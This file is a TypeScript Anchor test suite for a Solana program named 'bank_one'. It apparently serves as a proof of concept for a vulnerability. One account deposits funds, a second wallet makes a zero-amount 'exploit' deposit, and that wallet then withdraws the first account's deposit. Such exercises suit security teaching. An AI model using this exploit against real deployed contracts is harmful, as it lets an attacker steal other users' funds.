import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { BankOne } from "../target/types/bank_one";
import { assert } from "chai";

describe("bank_one", () => {
  const provider = anchor.AnchorProvider.env();
  const connection = provider.connection;
  const wallet = provider.wallet as anchor.Wallet;
  anchor.setProvider(provider);

  const program = anchor.workspace.BankOne as Program<BankOne>;

  const authority = new anchor.web3.Keypair();
  const amount = 1_000_000;

  before(async () => {
    const transferAmount = 1 * anchor.web3.LAMPORTS_PER_SOL;
    const transferTx = new anchor.web3.Transaction().add(
      anchor.web3.SystemProgram.transfer({
        fromPubkey: wallet.publicKey,
        toPubkey: authority.publicKey,
        lamports: transferAmount
      })
    );

    await provider.sendAndConfirm(transferTx);
  })

  it("Deposit", async () => {
    const tx = await program.methods.deposit(new anchor.BN(amount))
      .accounts({ authority: authority.publicKey })
      .transaction()

    const transactionSignature = await anchor.web3
      .sendAndConfirmTransaction(connection, tx, [authority], { commitment: "confirmed" })

    console.log("✅ signautre : ", transactionSignature);

    const exploitTransaction = await program.methods.deposit(new anchor.BN(0))
      .accounts({ authority: wallet.publicKey })
      .transaction()


    const exploitSignature = await anchor.web3
      .sendAndConfirmTransaction(connection, exploitTransaction, [wallet.payer], { commitment: "confirmed" })

    console.log("⚡ exploit signature : ", exploitSignature)
  })

  it("withdraw using exploit : ", async () => {
    const withdrawIx = await program.methods.withdraw(new anchor.BN(amount))
      .accounts({ authority: wallet.publicKey })
      .instruction()

    const withdrawExploitTx = new anchor.web3.Transaction().add(withdrawIx);

    const exploitWithdrawSignature = await anchor.web3
      .sendAndConfirmTransaction(connection, withdrawExploitTx, [wallet.payer], { commitment: "confirmed" })

      console.log("⚠️ exploit signature  :", exploitWithdrawSignature);
  })

});
